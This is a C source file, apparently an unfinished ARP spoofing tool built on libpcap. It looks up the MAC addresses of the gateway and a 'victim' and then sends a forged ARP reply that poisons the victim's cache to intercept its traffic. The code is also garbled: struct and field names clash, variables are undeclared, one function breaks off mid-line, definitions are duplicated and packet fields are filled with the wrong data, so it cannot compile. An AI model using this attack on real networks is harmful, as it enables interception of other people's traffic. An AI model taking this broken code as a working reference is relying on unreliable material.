#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <pcap.h>

#define Mac_len 6
#define Ether_len 6
#define Ip_len 15
struct Ether{
	u_char ether_dhost[Ether_len];
	u_char ether_shost[Ether_len];
	u_short ether_type;
};

struct Arp{
	u_char Tip[Ip_len];
	u_char Sip[Ip_len];
	u_char sMac[Mac_len];
	u_char TMac[Mac_len];
	u_char proto;
	u_char hardware;
	u_char opcode;
	u_char P_size;
	u_char H_size;
};

void mac_to_str(__u_char *src)
{
    printf("%x:%x:%x:%x:%x:%x\n",src[0],src[1],src[2],src[3],src[4],src[5]);
}

pcap_t *pd;

int main( int argc, char *argv[] ){
	victimIP = inet_addr(argv[1]);
	GateWayIP = getGatewayIP();
	MyIP = getMyIP();
	MyMac = getMyMac();

	GatewayMac = getGatewayMac();
	VictimMac = getVictimMac();

	pd = pcap_open_live("eth0", BUFSIZ, 1, 1000, errbuf);
 	

    send_arp(gateway_mac,
             victim_mac,
             DEF_ARP,
             my_mac,
             gateway_ip,
             victim_mac,
             victim_ip,
             DEF_REPLY,
             sizeof(ethernet_struct)+sizeof(arp_struct));

    return 0;

}

char* getGatewayMac(char* gatewayIP,char* myIP,char* myMac)
{
    char* packet
    char gatewayMac[256];
    gateway_mac = (__u_char *)malloc(MAC_ADDR_LEN);
    packet = set_Packet(gatewayIP,myIP,"00:00:00:00:00:00",myMac,sizeof(struct Ether)+sizeof(struct Arp),REQ);
    pcap_inject(pd,packet,sizeof(struct Ether)+sizeof(struct Arp));
    strcpy(gatewatMac,get_packet_until(gatewatIP));

    return gatewayMac;
}
#define ARP 0x0806
#define IP_addr_len 0x4
#define Hard_addr_len 0x6
#define REQ 0x01
#define REPLY 0x02
char* set_Packet(char* targetIP,char* senderIP,char* targetMac, char* senderMac,int size,u_char opcode){
	char* packet;
	struct Ether *E;
	struct Arp *arp;
	
	packet= (char *)malloc(size);
	E = (struct Ether *)packet;
	memcpy(E->ether_dhost,targetIP,Mac_len);
	memcpy(E->ether_shost,senderIP,Mac_len);
	E->ether_IP=htons(ARP);
	
	arp = (struct Arp *)(packet + sizeof(struct Ether));
	
	memcpy(arp->Tip,targetIP,Ip_len);
	memcpy(arp->Sip,senderIP,Ip_len);
	memcpy(arp->sMac,senderMac,Mac_len);
	memcpy(arp->TMac,targetmac,Mac_len);
	arp->hardeware = htons(0x01);
	arp->proto = htons(0x0800);
	arp->P_size = IP_addr_len;
	arp->H_size = Hard_addr_len;
	arp->opcode = htons(opcode);
	
	return packet;
}
	
void get_victim_mac()
{
    victim_mac = (__u_char *)malloc(MAC_ADDR_LEN);
    send_arp(my_mac,
             str_to_mac("FF:FF:FF:FF:FF:FF"),
             DEF_ARP,
             my_mac,
             my_ip,
             str_to_mac("00:00:00:00:00:00"),
             victim_ip,
             DEF_REQUEST,
             sizeof(ethernet_struct)+sizeof(arp_struct)); //get victim mac
    get_packet_until(victim_mac);
}

void get_packet_until(char* ip)
{
    int res;
    struct pcap_pkthdr *pk;
    const u_char *pkt_data;
    ethernet_struct *ethernet;
    arp_struct *arp;
    while((res = pcap_next_ex(handle, &header, &pkt_data)) >= 0)
    {
        if(res == 0) continue;
        ethernet = (ethernet_struct *)pkt_data;
        if(ntohs(ethernet->ether_type) == DEF_ARP)
        {
            arp = (arp_struct *)(pkt_data+sizeof(ethernet_struct));
            if(!memcmp(ethernet->dmac, my_mac, MAC_ADDR_LEN)&&
               ntohs(arp->opcode) == DEF_REPLY&&
               !memcmp(arp->target_mac, my_mac, MAC_ADDR_LEN)&&
               !memcmp(arp->target_mac, my_mac, MAC_ADDR_LEN))
            {
               mac_to_str(arp->send_mac);
               memcpy(out, arp->send_mac, MAC_ADDR_LEN);
               break;
            }
        }
    }
}

void send_arp(__u_char *src_mac, __u_char *dest_mac, __u_short e_type,
              __u_char *send_mac, __u_int send_ip, __u_char *target_mac, __u_int target_ip, __u_short opcode ,int size)
{
    char *packet;
    ethernet_struct *ethernet;
    arp_struct *arp;

    packet = (char *)malloc(size);
    ethernet = (ethernet_struct *)packet;

    memcpy(ethernet->smac, src_mac, MAC_ADDR_LEN);
    memcpy(ethernet->dmac, dest_mac, MAC_ADDR_LEN);
    ethernet->ether_type = htons(e_type);

    arp = (arp_struct *)(packet + sizeof(ethernet_struct));
    arp->hardware_type = htons(0x01);
    arp->protocol_type = htons(0x0800);
    arp->hardware_size = MAC_ADDR_LEN;
    arp->protocol_size = IP_ADDR_LEN;
    arp->opcode = htons(opcode);
    memcpy(arp->send_mac, send_mac, MAC_ADDR_LEN);
    memcpy(arp->send_ip,&send_ip,IP_ADDR_LEN);
    memcpy(arp->target_mac, target_mac, MAC_ADDR_LEN);
    memcpy(arp->target_ip,&target_ip,IP_ADDR_LEN);

    pcap_inject(handle, packet, size);
}

__u_char *mac(char *string)
{
    __u_char *mac = (__u_char *)malloc(Mac_LEN);
    sscanf(mac, "%x:%x:%x:%x:%x:%x",
           &string[0], &string[1], &string[2], &string[3], &string[4], &string[5]);
    return string;
}
char* getGatewayMac(char* GatewayIP){
	char * GMAC;
	GMAC = (__u_char *)malloc(M
	
char* getMyIP(){
	int fd;
	struct ifreq ifr;

	fd = socket(AF_INET, SOCK_DGRAM,0);
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name,"eth0",IFNAMSIZ-1);
	ioctl(fd,SIOCGIFADDR, &ifr);
	close(fd);

	return inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
}
char* getMyMac(){
	FILE *fp;
	char buf[256];
	fp = popen(" ifconfig | grep 'HWaddr' | awk '{ print $5}'","r");

	if( fp == NULL)
	{
		perror("error");
		exit(0);
	}
	fgets(buf, 18, fp);

	return buf;
}
char* getGatewayIP(){
	FILE *fp;
        char buf[256];
        fp = popen(" route | grep 'default' | awk '{print $2}'","r");

        if( fp == NULL)
        {
                perror("error");
                exit(0);
        }
        fgets(buf, 14, fp);

        return buf;
}
